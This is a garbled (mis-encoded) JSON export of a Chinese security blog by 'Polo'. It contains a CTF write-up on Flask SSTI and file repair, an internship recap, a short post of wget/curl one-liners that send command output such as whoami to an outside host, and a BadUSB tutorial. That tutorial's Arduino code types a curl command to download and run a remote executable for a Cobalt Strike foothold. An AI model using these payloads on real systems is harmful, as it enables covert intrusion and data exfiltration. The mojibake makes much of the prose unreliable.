Image:&#123;img&#125;&lt;/h1&gt;&lt;!-- ?img=1.png --&gt;&lt;img src=&quot;data:;base64,&#123;content&#125;&quot;&gt;&#x27;.format(img=img,content=content)@app.errorhandler(Exception)def all_exception_handler(e): e=str(e) return redirect(&quot;/err.php?errorinfo=&quot;+e, code=302)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=80) è¯»å–flagæ–‡ä»¶åï¼Œæ‹¿åˆ°flagã€‚ image-20210511161628308.png è¿™é¢˜æœ‰å‡ ä¸ªå‘ç‚¹ï¼Œé¦–å…ˆæ˜¯HTTPå¤´é‡Œé¢çš„PHP HEADER å®¹æ˜“è¿·æƒ‘äººï¼Œå…¶æ¬¡æ˜¯ç™»å½•é‚£çš„sqlæ³¨å…¥å®¹æ˜“è¿·æƒ‘äººï¼Œæœ€åæ˜¯FLASK-SSTIçš„åˆ©ç”¨æ–¹å¼éœ€è¦æŒæ¡å…¨é¢ï¼š 1.ç›´æ¥RCE 2.å¼€DEBUGæ—¶ï¼ŒSSTI è¯»æ–‡ä»¶-&gt;æ„é€ PINç -&gt;RCE 3.ä¼ªé€ sessionç™»å½• misc1æµé‡åŒ…æ²¡çœ‹å‡ºæ¥å•¥ï¼Œç›´æ¥åˆ†ç¦»httpå¯¹è±¡å‘ç°äº†flag.phpï¼Œå‹ç¼©åŒ…è¢«ç ´åäº†ï¼Œä¿®å¤ä¸‹å¤´ 12345678910111213141516171819202122232425262728293031JPEG (jpg)ï¼Œ æ–‡ä»¶å¤´ï¼šFFD8FF æ–‡ä»¶å°¾ï¼šFF D9 PNG (png)ï¼Œ æ–‡ä»¶å¤´ï¼š89504E47 æ–‡ä»¶å°¾ï¼šAE 42 60 82GIF (gif)ï¼Œ æ–‡ä»¶å¤´ï¼š47494638 æ–‡ä»¶å°¾ï¼š00 3B ZIP Archive (zip)ï¼Œ æ–‡ä»¶å¤´ï¼š504B0304 æ–‡ä»¶å°¾ï¼š50 4BTIFF (tif)ï¼Œ æ–‡ä»¶å¤´ï¼š49492A00 æ–‡ä»¶å°¾ï¼šWindows Bitmap (bmp)ï¼Œ æ–‡ä»¶å¤´ï¼š424D æ–‡ä»¶å°¾ï¼šCAD (dwg)ï¼Œ æ–‡ä»¶å¤´ï¼š41433130 æ–‡ä»¶å°¾ï¼šAdobe Photoshop (psd)ï¼Œ æ–‡ä»¶å¤´ï¼š38425053 æ–‡ä»¶å°¾ï¼šRich Text Format (rtf)ï¼Œ æ–‡ä»¶å¤´ï¼š7B5C727466 æ–‡ä»¶å°¾ï¼šXML (xml)ï¼Œ æ–‡ä»¶å¤´ï¼š3C3F786D6C æ–‡ä»¶å°¾ï¼šHTML (html)ï¼Œ æ–‡ä»¶å¤´ï¼š68746D6C3EEmail [thorough only] (eml)ï¼Œ æ–‡ä»¶å¤´ï¼š44656C69766572792D646174653AOutlook Express (dbx)ï¼Œ æ–‡ä»¶å¤´ï¼šCFAD12FEC5FD746FOutlook (pst)ï¼Œ æ–‡ä»¶å¤´ï¼š2142444EMS Word&#x2F;Excel (xls.or.doc)ï¼Œ æ–‡ä»¶å¤´ï¼šD0CF11E0MS Access (mdb)ï¼Œ æ–‡ä»¶å¤´ï¼š5374616E64617264204AWordPerfect (wpd)ï¼Œ æ–‡ä»¶å¤´ï¼šFF575043Adobe Acrobat (pdf)ï¼Œ æ–‡ä»¶å¤´ï¼š255044462D312EQuicken (qdf)ï¼Œ æ–‡ä»¶å¤´ï¼šAC9EBD8FWindows Password (pwl)ï¼Œ æ–‡ä»¶å¤´ï¼šE3828596RAR Archive (rar)ï¼Œ æ–‡ä»¶å¤´ï¼š52617221Wave (wav)ï¼Œ æ–‡ä»¶å¤´ï¼š57415645AVI (avi)ï¼Œ æ–‡ä»¶å¤´ï¼š41564920Real Audio (ram)ï¼Œ æ–‡ä»¶å¤´ï¼š2E7261FDReal Media (rm)ï¼Œ æ–‡ä»¶å¤´ï¼š2E524D46MPEG (mpg)ï¼Œ æ–‡ä»¶å¤´ï¼š000001BAMPEG (mpg)ï¼Œ æ–‡ä»¶å¤´ï¼š000001B3Quicktime (mov)ï¼Œ æ–‡ä»¶å¤´ï¼š6D6F6F76Windows Media (asf)ï¼Œ æ–‡ä»¶å¤´ï¼š3026B2758E66CF11MIDI (mid)ï¼Œ æ–‡ä»¶å¤´ï¼š4D546864 image-20210512132636816.png æå–rar image-20210512132807911.png åå…­è¿›åˆ¶è½¬ascii flag{My_Name_is_AoBai} misc2zipæ–‡ä»¶å¤´ä¿®å¤ å¾—åˆ°å¯†æ–‡5a6e4665536e506248206579666b7b39733930733833742d393637312d3433626a2d616f69302d3235663176393138707030377d åå…­è¿›åˆ¶è½¬ascii ZnFeSnPbHeyfk{9s90s83t-9671-43bj-aoi0-25f1v918pp07} ç»´å‰å°¼äºšè§£å¯†ï¼ˆcaptfencoder1.xç‰ˆæœ¬ ç»´å‰å°¼äºšè§£å¯†æœ‰bugï¼‰ flag{9a90f83e-9671-43ac-bbd0-25b1d918ca07} misc 3å‹ç¼©åŒ…å¤´éƒ¨ä¿®å¤ï¼Œä¿®æ”¹é”™äº†çš„1ä½ ç„¶åéœ€è¦å¯†ç ï¼Œç›´æ¥binwalkåˆ†ç¦»å‡ºæ¥ä¸€ä¸ªLinuxå¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ°è¿™é‡Œå¡ä½äº†ã€‚ã€‚ç„¶ååé¢çœ‹äº†çœ‹æ–‡ä»¶å¤´åº”è¯¥æ˜¯ä¸ªpngï¼ŒzhiweilaiåŠ ä¸Špngçš„ä¸ºæ–‡ä»¶å¤´åå‘ç°å›¾ç‰‡å®½é«˜æœ‰é—®é¢˜ï¼ŒLinuxæ‰“ä¸å¼€ï¼Œç”¨è„šæœ¬çˆ†ç ´å®½é«˜ä¿®æ”¹å³å¯ã€‚ è„šæœ¬å¦‚ä¸‹ 123456789101112131415161718192021222324252627282930import zlibimport structimport sysimport binasciifilename = sys.argv[1]with open(filename, &#x27;rb&#x27;) as f: all_b = f.read() crc32key = int(all_b[29:33].hex(),16) data = bytearray(all_b[12:29]) n = 4095 #ç†è®ºä¸Š0xffffffff,ä½†è€ƒè™‘åˆ°å±å¹•å®é™…/cpuï¼Œ0x0fffå°±å·®ä¸å¤šäº† for w in range(n): #é«˜å’Œå®½ä¸€èµ·çˆ†ç ´ width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) #qä¸º8å­—èŠ‚ï¼Œiä¸º4å­—èŠ‚ï¼Œhä¸º2å­—èŠ‚ for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(&quot;å®½ä¸ºï¼š&quot;,end=&quot;&quot;) width1=binascii.b2a_hex(width) width1=width1.decode(&#x27;utf-8&#x27;) width1=int(width1,16) print(width,width1) print(&quot;é«˜ä¸ºï¼š&quot;,end=&quot;&quot;) height1=binascii.b2a_hex(height) height1=height1.decode(&#x27;utf-8&#x27;) height1=int(height1,16) print(height,height1) exit(0) åœ¨å¯¹åº”çš„ä½ç½®ä¿®æ”¹å›¾ç‰‡å®½é«˜çš„åå…­è¿›åˆ¶å€¼å³å¯ã€‚ image-20210512175308222.png","categories":[],"tags":[],"author":"Polo"},{"title":"å®ä¹ &å­£åº¦æ€»ç»“","slug":"å®ä¹ -å­£åº¦æ€»ç»“","date":"2021-04-23T07:17:00.000Z","updated":"2021-04-30T03:43:43.747Z","comments":true,"path":"2021/04/23/å®ä¹ -å­£åº¦æ€»ç»“/","link":"","permalink":"https://polosec.github.io/2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/","excerpt":"","text":"ä»Šå¤©æ˜¯2021å¹´4æœˆ29æ—¥ï¼Œåˆšç»“æŸæŸå¸‚hwé¡¹ç›®ï¼Œåšå®Œè¿™ä¸ªé¡¹ç›®ï¼Œæˆ‘çš„å®ä¹ ç”Ÿæ´»åŸºæœ¬ç®—æ˜¯ç»“æŸäº†ã€‚è¿˜åœ¨é«˜é“ä¸Šï¼Œè¶ç€è¿™ä¸ªæ—¶é—´æ€»ç»“ä¸‹è¿™å››ä¸ªæœˆçš„å®ä¹ &amp;é¡¹ç›®ç”Ÿæ´»ã€‚ é‡‘å±±äº‘å®ä¹ ä»Šå¹´ä¸€æœˆä»½ï¼Œå¼€å§‹äº†åœ¨é‡‘å±±äº‘å®ä¹ çš„æ—¥å­ï¼Œæ€»è®¡çº¦ä¸‰ä¸ªæœˆï¼Œå…¶å®å¹²æ´»çš„æ—¶é—´ä¹Ÿå°±å››åæ¥å¤©ï¼Œä¸­é—´ç®—ä¸Šè¿‡å¹´ã€è¯·å‡ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥æ—¥å­å°±æ¯”è¾ƒå°‘äº†ã€‚å’ŒåŒäº‹ä»¬çš„ç›¸å¤„å¾ˆæ„‰å¿«ï¼Œé¢†å¯¼æ˜¯ææŠ€æœ¯çš„ï¼Œç›¸å¤„èµ·æ¥éå¸¸èˆ’æœã€‚åœ¨é‡‘å±±çš„è¿™æ®µæ—¶é—´è¿˜ç®—æ˜¯æ¯”è¾ƒå¿«ä¹çš„ï¼Œè™½ç„¶ç´¯äº†ä¸€ç‚¹ï¼Œä½†æ˜¯æ”¶è·ç›¸å¯¹è¿˜ä¸é”™ã€‚åœ¨é‡‘å±±ï¼Œé¦–å…ˆæ˜¯åœ¨åšé¡¹ç›®çš„è¿‡ç¨‹ä¸­å­¦åˆ°äº†ä¸€äº›çŸ¥è¯†ï¼Œæ¸—é€çš„æ€è·¯ã€æµ‹è¯•æ–¹æ³•å•¥çš„ï¼Œæˆ‘è§‰å¾—è¿™äº›æ¯”è¾ƒé‡è¦ï¼Œå…¶æ¬¡æ˜¯åœ¨å…¬å¸é’“é±¼çš„é¡¹ç›®ä¸­å­¦åˆ°äº†çº¢é˜ŸçŸ¥è¯†ï¼Œå¹¶ä¸”å¼€å¯äº†æˆ‘å¯¹çº¢é˜Ÿå‘å¾€çš„å¤§é—¨ã€‚åœ¨å…¬å¸ï¼Œæˆ‘å­¦åˆ°äº†ä¸€äº›ç®€å•çš„å…æ€æŠ€å·§ï¼Œå¹¶ä¸”è¿˜ä¼šç»§ç»­é’»ç ”ï¼›æ¥è§¦åˆ°äº†é’“é±¼é‚®ä»¶ä¼ªé€ ï¼Œç›®å‰è¿˜åœ¨å­¦ä¹ ï¼›Badusbä¸Šçº¿CSé©¬ï¼Œè¿™ä¸ªå·²ç»å®ç°äº†ã€‚è¿˜æœ‰å°±æ˜¯åŸºæœ¬çš„åº”æ€¥å“åº”æŠ€èƒ½ï¼Œåœ¨å…¬å¸æˆ‘ç‹¬ç«‹å¤„ç†äº†ä¸€èµ·åº”æ€¥å“åº”äº‹ä»¶ï¼Œæˆ‘è§‰å¾—çœŸçš„æ˜¯å¾ˆæ£’çš„å®è·µæœºä¼šã€‚æœ€åæ˜¯ç¤¾äº¤æ–¹é¢ï¼Œè®¤è¯†äº†ä¸€äº›æœ‹å‹ã€‚å…¶ä»–è™šæ— ç¼¥ç¼ˆçš„ä¸è¯´äº†ï¼Œåªè¯´äº›å®é™…çš„ã€‚ hwè“é˜Ÿä»Šå¹´hwå»äº†é’è—¤ï¼Œæœ¬æ¥ç­¾äº†æ·±è“ï¼Œæ·±è“çš„è´Ÿè´£äººå¯¹æˆ‘ä¹Ÿå¾ˆå¥½ï¼Œä½†æ˜¯åé¢å‡ºäº†ç‚¹äº‹æƒ…ï¼Œæ‰€ä»¥æˆ‘å°±ç»™é¸½äº†â€¦ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ„Ÿè°¢ç¡•å“¥ç»™æˆ‘æœºä¼šï¼Œå¼Ÿå¼Ÿé“­è®°åœ¨å¿ƒã€‚è¯´å®åœ¨çš„ï¼Œhwæˆ‘æ˜¯å¤œç­ï¼Œä¸»è¦æ˜¯çœ‹HIDSè®¾å¤‡å‘Šè­¦ï¼Œè¢«åœ°æ–¹çš„ç»™æçƒ¦äº†ï¼Œç»å¸¸æœ‰è¯¯æŠ¥ï¼Œç™½å¤©çš„åŒæ—¶ä¹Ÿå¾ˆè¾›è‹¦ï¼Œæˆ‘è§‰å¾—æˆ‘å¤œç­è¿˜æ˜¯éå¸¸å¹¸è¿çš„ï¼Œå°±æ˜¯èº«ä½“ä¸Šç´¯äº†ç‚¹ã€‚æˆ‘è§‰å¾— é€šè¿‡è¿™æ¬¡hw è®¤è¯†æœ‹å‹æ¯”è¾ƒé‡è¦å§ï¼Œå…¶æ¬¡å°±æ˜¯çœŸçœŸæ­£æ­£åœ°æ¥è§¦äº†ä¸€ä¸‹è¿™ç§å¤§å‹çš„å®‰å…¨é¡¹ç›®ï¼Œä¹‹å‰å¹¶æ²¡æœ‰æ¥è§¦è¿‡ã€‚è¿˜æœ‰å°±æ˜¯åœ¨hwæ—¶çš„ä¸€äº›å¤„ç†äº‹æƒ…çš„æ–¹æ³•ï¼Œæ¯”å¦‚å¤„ç½®æµç¨‹ã€æƒé™ä¸èŒè´£ã€‚ä¹‹ç±»çš„ä¹‹å‰ä¹Ÿåªæ˜¯é™äºç†è®ºï¼Œä¹Ÿæ›´åŠ äº†è§£äº†æˆ‘æƒ³è±¡ä¸­çš„hwå’ŒçœŸå®çš„hwçš„åŒºåˆ«2333. hwçº¢é˜Ÿæœ€åæ‰“äº†ä¸€æ¬¡å¿å¸‚çº§çš„hwçº¢é˜Ÿï¼Œå…¶å®è¿˜æ˜¯æŒºä¸¢äººçš„ï¼Œæˆ‘è‡ªå·±çŸ¥é“è‡ªå·±æ°´å¹³ä¸è¡Œï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³å»è¯•è¯•ã€‚è™½ç„¶æœ‹å‹è·Ÿæˆ‘è®²äº†æ˜¯æ— è´£çš„ï¼Œä½†æ˜¯æ‰“äº†é‚£ä¹ˆçƒ‚çš„æˆç»©ï¼Œè‡ªå·±å¿ƒé‡ŒçœŸçš„ä¸å¥½å—ã€‚ã€‚ç›¸æ¯”äºæ‹¿åˆ°å·¥èµ„ï¼Œæ›´å¤šçš„æ˜¯è‡ªè´£å§ã€‚å½“ç„¶äº†ï¼Œåœ¨è¿™æ¬¡çš„çº¢é˜Ÿä¹‹æ—…ä¸­ä¹Ÿå­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ã€‚é¦–å…ˆæ˜¯è‡ªå·±çš„æ¸—é€æ€è·¯é—®é¢˜ï¼Œæ¸—é€æ€è·¯é¦–å…ˆæ˜¯ä¸æ¸…æ™°ï¼Œå…¶æ¬¡æ˜¯å¤ªçª„ã€‚ä¿¡æ¯æ”¶é›†æ—¶ç»å¸¸æœ‰é—æ¼æˆ–è€…å¯¹è¿™ä¸ªç«™åšäº†æŸæ–¹æ³•çš„æ”¶é›†ï¼Œåˆ°äº†ä¸‹ä¸ªç«™å°±å¿˜äº†æˆ–è€…ä¸æƒ³åšäº†ã€‚ã€‚è¿™ä¸ªæ¯›ç—…ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½æ”¹æ‰ã€‚å…¶æ¬¡æ˜¯æ¼æ´çš„åŸç†æŒæ¡çš„ä¸å¤Ÿå¥½å’Œæ¼æ´ç±»å‹æŒæ¡çš„ä¸å¤Ÿå¤šï¼Œç»•wafç­‰æ“ä½œéœ€è¦è¾ƒå¼ºçš„åŸºç¡€æ€§çŸ¥è¯†ã€‚å°±åƒsstiç»•è¿‡ä¸€æ ·~ä¸ç®¡æ€ä¹ˆè¯´ï¼Œçº¢é˜Ÿæ¥äº†è¿™ä¸€è¶Ÿæˆ‘ä¸ªäººæ˜¯ä¸äºçš„ï¼Œä½†æ˜¯å¯¹ä¸èµ·æœ‹å‹äº†ã€‚ åè¯å¸Œæœ›ä¸‹æ¬¡çœ‹åˆ°è¿™ç¯‡åšå®¢ï¼Œèƒ½å¯¹æ¯”å†™æ—¶æœ‰äº›è¿›æ­¥ã€‚","categories":[],"tags":[],"author":"Polo"},{"title":"å‘½ä»¤æ‰§è¡Œç»“æœå¤–å¸¦","slug":"å‘½ä»¤æ‰§è¡Œç»“æœå¤–å¸¦","date":"2021-04-17T18:25:55.000Z","updated":"2021-04-17T21:37:56.341Z","comments":true,"path":"2021/04/18/å‘½ä»¤æ‰§è¡Œç»“æœå¤–å¸¦/","link":"","permalink":"https://polosec.github.io/2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/","excerpt":"","text":"wget â€“header=â€test:$(whoami)â€ http://ssti.com:5000\\?username\\=1 whoami | curl -F â€œ:data=@-â€œ http://ssti.com:5000\\?username\\=1 Curl â€œhttp://ssti.com:5000?username=&#96;whoami&#96;&quot;","categories":[],"tags":[]},{"title":"badusbè¸©å‘&è¿‘æœŸæ„Ÿæƒ³","slug":"badusbè¸©å‘-è¿‘æœŸæ„Ÿæƒ³","date":"2021-03-29T12:34:48.000Z","updated":"2021-11-04T04:22:37.815Z","comments":true,"path":"2021/03/29/badusbè¸©å‘-è¿‘æœŸæ„Ÿæƒ³/","link":"","permalink":"https://polosec.github.io/2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/","excerpt":"","text":"å‰è¨€ï¼š è¿‘æœŸåœ¨å…¬å¸å†…éƒ¨å­¦äº†ä¸€ç‚¹çº¢é˜ŸæŠ€èƒ½ï¼Œè™½ç„¶ç›®å‰ç”¨ä¸ä¸Šï¼Œä½†æ˜¯åšä¸ªè®°å½•ï¼Œé¡ºä¾¿å‘ç‰¢éªšã€‚ è‡´è°¢&amp;å‚è€ƒhttps://www.freebuf.com/articles/system/261020.html https://blog.csdn.net/sxhexin/article/details/87914649 https://www.anquanke.com/post/id/227477 https://www.freebuf.com/articles/system/261020.html Badusb æ’å…¥ä¸Šçº¿cobalt strikeå‡†å¤‡å·¥ä½œATtiny85 å¼€å‘æ¿ã€arduino IDEä¸‹è½½https://www.arduino.cc/en/Main/Softwaredigisparkã€‚æš‚æ—¶å…ˆä¸è¦è£…é©±åŠ¨ï¼ï¼é©±åŠ¨æœ‰å¤§å‘ã€‚ çœ‹freeebufé‡Œé¢çš„æ•™ç¨‹è£…å®Œé©±åŠ¨ï¼Œçƒ§å½•å®Œåªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œéœ€è¦æ›´æ–°ä¸‹å›ºä»¶æ‰å¯ä»¥é‡å¤ä½¿ç”¨ï¼Œåé¢ä¼šæåˆ°ã€‚ ç¯å¢ƒé…ç½®æ‰“å¼€IDE,åœ¨æ–‡ä»¶-&gt;é¦–é€‰é¡¹ä¸­åŠ å…¥é™„åŠ å¼€å‘æ¿ç®¡ç†ï¼Œé™„åŠ å¼€å‘æ¿ç®¡ç†ç½‘å€å¤„å†™ 1http:&#x2F;&#x2F;digistump.com&#x2F;package_digistump_index.json æ³¨æ„ï¼Œè¿™é‡Œéœ€è¦ç¿»å¢™ï¼Œåé¢æ·»åŠ å¼€å‘æ¿ä¸‹è½½ç›¸å…³é…ç½®æ—¶ä¹Ÿéœ€è¦ç¿»å¢™ï¼Œç°åœ¨å°±ç¿»ç€ åˆ«æ–­äº†ã€‚ æ·»åŠ å¼€å‘æ¿IDEä¸­-å·¥å…·-å¼€å‘æ¿ç®¡ç†ï¼Œç±»å‹-contributed/è´¡çŒ®ï¼Œé€‰æ‹© ç„¶åé€‰å®‰è£…ï¼ˆç¿»å¢™ï¼‰ å®‰è£…å¥½åï¼Œé€‰æ‹©è¿™ä¸ª16.5mhzçš„å¼€å‘æ¿ã€‚ æ›´æ–° boot loaderæ›´æ–° BootLoaderçš„æ•™ç¨‹çœ‹ https://blog.csdn.net/sxhexin/article/details/87914649ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œè·Ÿç€è¿™ä¸ªæ•™ç¨‹èµ°æ²¡é—®é¢˜çš„ï¼Œå¦‚æœä½ ä¹‹å‰æœ‰è£…ç›¸å…³é©±åŠ¨ï¼Œè¯·æŠŠé©±åŠ¨å¸è½½å¹²å‡€ï¼ï¼ï¼ æ›´æ–°BootLoaderæ˜¯å› ä¸ºé¿å…è¸©çƒ§å½•å®Œåªèƒ½è¿è¡Œä¸€æ¬¡çš„å‘ï¼ï¼ BootLoaderæ˜¯å¤§å‘ï¼Œä¸€å®šè¦å¥½å¥½å¼„ï¼ ç¼–å†™ä»£ç æœ‰å…´è¶£ä¸€æ­¥æ­¥èµ°çš„å¯ä»¥å†™ä¸ªæµ‹è¯•ä»£ç  cmdå¼¹ä¸ªçª—ä»€ä¹ˆçš„ï¼Œæˆ‘è¿™é‡Œä¸€æ­¥åˆ°ä½ï¼Œç›´æ¥è¿œç¨‹åŠ è½½exeã€‚ å¯¹äºcs å¯ä»¥ç”Ÿæˆpowershellï¼Œç„¶åcmdé‡Œé¢powershellåŠ è½½è°ƒç”¨ç›´æ¥ä¸Šçº¿ã€‚ ä½¿ç”¨CMDè¿œç¨‹ä¸‹è½½å¯æ‰§è¡Œæ–‡ä»¶æˆ‘é€‰æ‹©ç”¨cmdçš„åŸå› æ˜¯å› ä¸º æˆ‘è¿˜ä¸ä¼špowershellå…æ€ï¼ˆ2333ï¼‰ æ‰€ä»¥ æ¢ç´¢äº†ä¸‹ å¦‚ä½•ç±»ä¼¼Linuxæ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼Œå‘ç°åœ¨Windows cmdä¸‹æ˜¯andç¬¦å·&amp;ã€‚ æ‰§è¡Œå‘½ä»¤çš„ä»£ç æ¡†æ¶å¦‚ä¸‹ï¼š 123456789101112#include &quot;DigiKeyboard.h&quot;//åº“æ–‡ä»¶void setup() &#123;// setupå‡½æ•°åªè¿è¡Œä¸€æ¬¡DigiKeyboard.delay(2000);//ç­‰å¾…ä¸¤ç§’ï¼Œç»™ç”µè„‘è‡ªåŠ¨åŠ è½½é…ç½®æ—¶é—´DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//æ‘ä½WINé”®DigiKeyboard.delay(300);//ç­‰å¾…300æ¯«ç§’DigiKeyboard.println(&quot;cmd&quot;);//è¾“å…¥CMDDigiKeyboard.delay(300);DigiKeyboard.println(&quot;curl http://12xxxx0/calc.exe &gt; E:\\\\calc.exe &amp; E:\\\\calc.exe&quot;);//æ‰§è¡ŒPAYLOADï¼ŒåŒå¼•å·éœ€è¦æ–œæ è½¬ä¹‰&#125;void loop() &#123;&#125; æ³¨æ„ï¼Œåœ¨æœ€åä¸€ä¸ªæ³¨é‡Šå¤„ï¼Œæ˜¯åœ¨å‰é¢è¯­å¥æ‰“å¼€cmdé»‘æ¡†çš„æƒ…å†µä¸‹ï¼Œåœ¨cmdä¸­è¾“å…¥çš„è¯­å¥ã€‚ä¸¤ä¸ªåæ–œæ æ˜¯ä¸ºäº†è½¬ä¹‰ã€‚ æˆ‘çš„æ€è·¯æ˜¯ï¼Œå°†å¯æ‰§è¡Œexeæ–‡ä»¶ä¸Šä¼ è‡³æœåŠ¡å™¨ï¼Œé€šè¿‡curlçš„æ–¹å¼ä¸‹è½½å¹¶é‡å®šå‘è‡³æŸä¸ªé©±åŠ¨å™¨å¹¶æ‰§è¡Œã€‚ æˆ‘æœ¬æ¥æƒ³æ”¾åˆ°Cç›˜ï¼Œä½†æ˜¯æ”¾åˆ°Cç›˜ï¼Œæœ‰å¯èƒ½å­˜åœ¨æƒé™é—®é¢˜ï¼ˆæ”¾åœ¨C:\\Windows\\Tempï¼‰ç›®å½•ä¸‹ä¹Ÿæœ‰äº›é—®é¢˜ï¼Œäºæ˜¯æ”¾åˆ°äº†D/Eç›˜ã€‚ å°†ä¸Šè¿°ä»£ç åœ¨IDEä¸­è¾“å…¥åctrl+uä¸Šä¼ ï¼Œç„¶åæ’å…¥attiny85 ä¸€å®šæ˜¯å…ˆæ‹”å‡ºæ¥ï¼Œå‡ºç°è¿™ä¸ª 60secondsçš„æ—¶å€™æ’è¿›å»ï¼Œå‡ºç°ä¸‹é¢è¿™ä¸€ä¸²ä»£è¡¨å†™å…¥æˆåŠŸ å¹¶ä¸”ä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ã€‚ ç„¶åæ‹”å‡ºæ¥ å†æ’è¿›å»çš„æ—¶å€™ å°±æœ‰å¼¹è®¡ç®—å™¨çš„æ•ˆæœäº†ã€‚ï¼ˆå°æ€è€ƒï¼Œå¦‚ä½•åœ¨æ‰§è¡Œå®Œexeåè‡ªåŠ¨å…³é—­cmdé»‘æ¡†ï¼Ÿï¼‰ æ•ˆæœå¦‚ä¸‹ï¼š CMDä¸Šçº¿CSå«–æ¥äº†å¤§ä½¬çš„å…æ€æ–¹æ³•2333 è¯•ä¸€ä¸‹exeä¸Šçº¿cs å°æ€è€ƒçš„ç­”æ¡ˆæ˜¯ï¼šå‘½ä»¤åè·Ÿ&amp; exit; 23333 æ‚è°ˆ5pyA6L+R5LiN5pivaHfkuYjvvIzorqTor4bkuIDkuKrlhazlj7jnmoRocuWnkOWnkO+8jOacgOi/keS5n+WcqGh35oub5Lq677yM6ZyA6KaB5LiA5Lqb5pyJ5omL5bCx6KGM55qE5bKX5L2N77yM5a+55rKh5Y67aHfov4cg5bm25LiU5oqA5pyv5LiN5oCO5LmI5qC355qE5ZCM5a2m5p2l6K+077yMNDAw5LiA5aSp55qE5b6F6YGH44CB5YyF5ZCD5L2P44CB5LiN6ZyA6KaB6Ieq5bex5Z6r6ZKx44CB6aG555uu546w5Zy65pyJ5Lq65bim77yM5oiR6KeJ5b6X5bey57uP5b6I5aW95ZWm44CC5aaC5p6c5oiR5aSn5LqM55qE5pe25YCZ5pyJ6L+Z56eN5py65Lya77yM5ZOq5oCV5LiN57uZ5oiR5bel6LWE77yM5oiR5Lmf6KaB5Y6744CC5oiR5L2c5Li65LiA5Liq5a2m55Sf77yM6Zmk5LqG5aSW5Ye66Ieq5bex5o6l6aG555uu77yM5a6e5Zyo5piv5oOz5LiN5Yiw6L+Y5pyJ5LuA5LmI5q+UaHfmm7Tlpb3nmoTog73nm7jlr7nku47nroDljZXlvIDlp4vmjqXop6blronlhajlrp7miJjnmoTlnLrmma/kuobjgILvvIhTUkPkuI3nrpfvvIxTUkPkuZ/pnIDopoHnm7jlvZPnmoTlronlhajln7rnoYDjgILvvInmiJHmiorov5nkuKrmtLvmjqjov4fljrvkuYvlkI7vvIzkuInkuKrluIjlvJ/kuZ/lvojnu5nlipvvvIzpgJrov4fkuobpnaLor5XjgILlj6/kuIfkuIfmsqHmg7PliLDor7flgYfnmoTml7blgJnlh7rpl67popjkuobvvIzlr7zlkZjor7TnjrDlnKjnmoTph43lv4PlupTor6XmmK/kuJPkuJror77lrabkuaDjgIHogIzkuI3mmK/mg7PnnYDlh7rljrvlrp7kuaDvvIzlubbkuJTmi7/miJHkuL7kvovlrZAyMzMz44CC5pyA5ZCO6L+Y6K+077yM5Y+q6KaB5L2g5Y675LqG5bCx57uZ5L2g6YCA5a2m77yM55yf5LiN5oiz44CC54S26ICM5pu05Y+v56yR55qE5piv77yM5p+Q6ICB5biI5ZyoMTfnuqfpgJrnn6XnvqTlj5Hkuoblj6bkuIDlrrbmnLrmnoTnmoRod+Wuo+S8oO+8jOW+hemBh+aIkeS5n+ivtOS4i++8jDMwMC00MDDkuIDlpKnvvIzkuI3ljIXlkIPkvY/vvIzmnInlhY3otLnln7norq3vvIzmoLnmja7ln7norq3ogIPmoLjnu5PmnpzliIbnuqLok53pmJ/vvIjvvJ/vvInvvIznhLblkI7miJHmiZPnlLXor53ov4fljrvpl67kuobkuIvvvIzmu6HlmLTot5/miJHosIjnkIbmg7PosIjpgZPlvrfosIjmioDmnK/jgIHlsLHor7TlrabnlJ/kuI3opoHogIHmg7PnnYDmjKPpkrHkupHkupHjgILmiJHkvLDorqEg5LiN57uZ5oiR6L+Z5LiJ5Liq5biI5byf5YGH55qE5Y6f5Zug77yM5bqU6K+l5piv5Yqo5LqG5LuW5Lus55qE6JuL57OV5LqG5ZCn77yM5LuO6YKj6L656LWw6IO95oq96ZKxMjMzM+OAguWtpumZouWvueaIkeW+iOWlveOAgeWQhOS9jemihuWvvOiAgeW4iOWSjOiUvOWPr+S6su+8jOWtpumZouS5n+e7meS6huaIkeaOqOWFjeWQjemine+8jOmhuuWIqeaOqOWFjeiHs1VFU1RD44CC5b+D5oCA5oSf5oGp5LmL5b+D77yM5oOz5o6o5biI5byf5LiA5oqK77yM5Y67aHfvvIzmsqHmg7PliLDnq5/nhLbkuI3nu5nlh4blgYfvvIznnJ/nmoTvvIzlv4Pph4zpnaLlh4nkuoblvojlpJrjgILkuI3or7TkuoZ+57un57ut5YaZ5q+V5Lia6K665paH5LqGfg==","categories":[],"tags":[]},{"title":"è¿‘ä¸€å¹´å­¦ä¹ æ€»ç»“","slug":"è¿‘ä¸€å¹´å­¦ä¹ æ€»ç»“","date":"2021-03-06T08:56:06.000Z","updated":"2021-03-06T09:10:50.739Z","comments":true,"path":"2021/03/06/è¿‘ä¸€å¹´å­¦ä¹ æ€»ç»“/","link":"","permalink":"https://polosec.github.io/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"è™½ç„¶æ¥è§¦å®‰å…¨ä»åˆä¸­å°±ç®—å¼€å§‹äº†ï¼Œä½†å½“æ—¶ä¹Ÿä»…ä»…æ˜¯åœç•™äºæ··æ··å¨±ä¹åœˆï¼Œæ—¥ä¸€æ—¥åˆ«äººçš„webshellã€‚ 